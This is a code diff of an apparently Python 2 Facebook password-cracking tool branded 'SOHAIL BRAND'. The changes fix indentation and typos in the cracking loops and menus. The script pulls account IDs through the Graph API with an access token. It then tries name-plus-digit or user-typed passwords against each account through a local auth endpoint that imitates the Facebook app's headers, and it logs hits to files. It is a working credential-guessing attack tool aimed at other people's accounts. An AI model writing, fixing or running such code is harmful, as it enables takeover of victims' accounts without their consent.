@@ -13,19 +13,19 @@ try:
     os.mkdir('/sdcard/ids')
 except OSError:
     pass
-bd = random.randint(20000000.0, 30000000.0)
+bd = random.randint(20000000, 30000000)
 sim = random.randint(20000, 40000)
 header = {'x-fb-connection-bandwidth': repr(bd), 
    'x-fb-sim-hni': repr(sim), 
    'x-fb-net-hni': repr(sim), 
    'x-fb-connection-quality': 'EXCELLENT', 
    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
-   'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/Pos[...]
+   'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/Pos[...[...]
    'content-type': 'application/x-www-form-urlencoded', 
    'x-fb-http-engine': 'Liger'}
 os.system('git pull')
 os.system('clear')
-logo = '\n\x1b[1;92mAnaya Fatima\n\x1b[1;92mSOHAIL BRAND\n\x1b[1;91m---------------------------SXB--------------------\n\x1b[1;97m\xe2\x9e\xa3 Author : SOHAIL ARAIN\n\x1b[1;97m\xe2\x9e\xa3 WHATSAPP: 03063683343\n\x1b[1;91m---------------------------SXB--------------------'
+logo = '\n\x1b[1;92mAnaya Fatima\n\x1b[1;92mSOHAIL BRAND\n\x1b[1;91m---------------------------SXB--------------------\n\x1b[1;97m\xe2\x9e\xa3 Author : SOHAIL ARAIN\n\x1b[1;97m\xe2\x9e\xa3 WHATSAPP: 0[...]
 
 def ip():
     os.system('clear')
@@ -66,7 +66,6 @@ os.system('pkill -f "node index.js"')
 os.system('cd ~/sohailking && node index.js &')
 time.sleep(5)
 ip()
-    
 
 
 def log_menu():
@@ -97,8 +96,6 @@ def log_menu_s():
         log_menu_s()
 
 
-
-
 def log_token():
     os.system('clear')
     print logo
@@ -110,8 +107,6 @@ def log_token():
     t_s.write(tok)
     t_s.close()
     menu()
-
-
 
 
 def menu():
@@ -236,7 +231,7 @@ def a_s():
     if a_s == '1':
         os.system('clear')
         print logo
-        print '\x1b[1;93m~~~~5 Name pass public cracking ~~~~\x1b[1;91m'
+        print '\x1b[1;93m~~~~8 Name pass public cracking ~~~~\x1b[1;91m'
         print 47 * '-'
         print '\x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
         print 47 * '-'
@@ -244,10 +239,10 @@ def a_s():
         p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
         p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
         p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
-	p5 = raw_input(' \x1b[1;92m[5]Name + digit: ')
-	p6 = raw_input(' \x1b[1;92m[6]Name + digit: ')
-	p7 = raw_input(' \x1b[1;92m[7]Name + digit: ')
-	p8 = raw_input(' \x1b[1;92m[8]Name + digit: ')
+        p5 = raw_input(' \x1b[1;92m[5]Name + digit: ')
+        p6 = raw_input(' \x1b[1;92m[6]Name + digit: ')
+        p7 = raw_input(' \x1b[1;92m[7]Name + digit: ')
+        p8 = raw_input(' \x1b[1;92m[8]Name + digit: ')
         idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
         try:
             r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
@@ -281,10 +276,10 @@ def a_s():
         p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
         p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
         p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
-	p5 = raw_input(' \x1b[1;92m[5]Name + digit: ')
-	p6 = raw_input(' \x1b[1;92m[]Name + digit: ')
-	p7 = raw_input(' \x1b[1;92m[7]Name + digit: ')
-	p8 = raw_input(' \x1b[1;92m[8]Name + digit: ')
+        p5 = raw_input(' \x1b[1;92m[5]Name + digit: ')
+        p6 = raw_input(' \x1b[1;92m[6]Name + digit: ')
+        p7 = raw_input(' \x1b[1;92m[7]Name + digit: ')
+        p8 = raw_input(' \x1b[1;92m[8]Name + digit: ')
         idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
         try:
             r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
@@ -318,10 +313,10 @@ def a_s():
         p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
         p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
         p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
-	p5 = raw_input(' \x1b[1;92m[5]Name + digit: ')
-	p6 = raw_input(' \x1b[1;92m[6]Name + digit: ')
-	p7 = raw_input(' \x1b[1;92m[7]Name + digit: ')
-	p8 = raw_input(' \x1b[1;92m[8]Name + digit: ')
+        p5 = raw_input(' \x1b[1;92m[5]Name + digit: ')
+        p6 = raw_input(' \x1b[1;92m[6]Name + digit: ')
+        p7 = raw_input(' \x1b[1;92m[7]Name + digit: ')
+        p8 = raw_input(' \x1b[1;92m[8]Name + digit: ')
         try:
             idlist = raw_input('[+] File Name: ')
             for line in open(idlist, 'r').readlines():
@@ -336,7 +331,7 @@ def a_s():
         menu()
     else:
         print ''
-        print '\tChoose valid option' + w
+        print '\tChoose valid option'
         a_s()
     print ' Total ids: ' + str(len(id))
     time.sleep(0.5)
@@ -412,8 +407,8 @@ def a_s():
                             cp = open('HOP_CP.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
-                            cps.apppend(uid + pass4)
-			else:
+                            cps.append(uid + pass4)
+                        else:
                             pass5 = name.lower() + p5
                             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                             q = json.loads(data)
@@ -428,9 +423,8 @@ def a_s():
                                 cp = open('HOP_CP.txt', 'a')
                                 cp.write(uid + ' | ' + pass5 + '\n')
                                 cp.close()
-                                cps.apppend(uid + pass5)
-			    
-			    else:
+                                cps.append(uid + pass5)
+                            else:
                                 pass6 = name.lower() + p6
                                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                 q = json.loads(data)
@@ -445,9 +439,8 @@ def a_s():
                                     cp = open('HOP_CP.txt', 'a')
                                     cp.write(uid + ' | ' + pass6 + '\n')
                                     cp.close()
-                                    cps.apppend(uid + pass6)
-			       
-			        else:
+                                    cps.append(uid + pass6)
+                                else:
                                     pass7 = name.lower() + p7       
                                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                     q = json.loads(data)
@@ -462,9 +455,8 @@ def a_s():
                                         cp = open('HOP_CP.txt', 'a')
                                         cp.write(uid + ' | ' + pass7 + '\n')
                                         cp.close()
-                                        cps.apppend(uid + pass7)
-				    
-				    else:
+                                        cps.append(uid + pass7)
+                                    else:
                                         pass8 = name.lower() + p8      
                                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                         q = json.loads(data)
@@ -479,8 +471,7 @@ def a_s():
                                             cp = open('HOP_CP.txt', 'a')
                                             cp.write(uid + ' | ' + pass8 + '\n')
                                             cp.close()
-                                            cps.apppend(uid + pass8)
-					
+                                            cps.append(uid + pass8)
         except:
             pass
 
@@ -554,7 +545,7 @@ def c_s():
         pass2 = raw_input(' \x1b[1;92m[2]Password: ')
         pass3 = raw_input(' \x1b[1;92m[3]Password: ')
         pass4 = raw_input(' \x1b[1;92m[4]Password: ')
-	pass5 = raw_input(' \x1b[1;92m[5]Password: ')
+        pass5 = raw_input(' \x1b[1;92m[5]Password: ')
         idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
         try:
             r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
@@ -588,7 +579,7 @@ def c_s():
         pass2 = raw_input(' \x1b[1;92m[2]Password: ')
         pass3 = raw_input(' \x1b[1;92m[3]Password: ')
         pass4 = raw_input(' \x1b[1;92m[4]Password: ')
-	pass5 = raw_input(' \x1b[1;92m[5]Password: ')
+        pass5 = raw_input(' \x1b[1;92m[5]Password: ')
         idt = raw_input(' \x1b[1;93mEnter id: ')
         try:
             r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
@@ -622,7 +613,7 @@ def c_s():
         pass2 = raw_input(' \x1b[1;92m[2]Password: ')
         pass3 = raw_input(' \x1b[1;92m[3]Password: ')
         pass4 = raw_input(' \x1b[1;92m[4]Password: ')
-	pass5 = raw_input(' \x1b[1;92m[5]Password: ')
+        pass5 = raw_input(' \x1b[1;92m[5]Password: ')
         try:
             idlist = raw_input('[+] File Name: ')
             for line in open(idlist, 'r').readlines():
@@ -637,7 +628,7 @@ def c_s():
         menu()
     else:
         print ''
-        print '\t Choose valid option' + w
+        print '\t Choose valid option'
         c_s()
     print ' Total ids: ' + str(len(id))
     time.sleep(0.5)
@@ -709,8 +700,8 @@ def c_s():
                             cp = open('HOP_CP.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
-                            cps.apppend(uid + pass4)
-			else:
+                            cps.append(uid + pass4)
+                        else:
                             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                             q = json.loads(data)
                             if 'loc' in q:
@@ -724,7 +715,7 @@ def c_s():
                                 cp = open('HOP_CP.txt', 'a')
                                 cp.write(uid + ' | ' + pass5 + '\n')
                                 cp.close()
-                                cps.apppend(uid + pass5)
+                                cps.append(uid + pass5)
         except:
             pass
 
@@ -736,7 +727,3 @@ def c_s():
     print 47 * '-'
     raw_input('\x1b[1;93m Press enter to back')
     choice_crack()
-
-
-                     
-
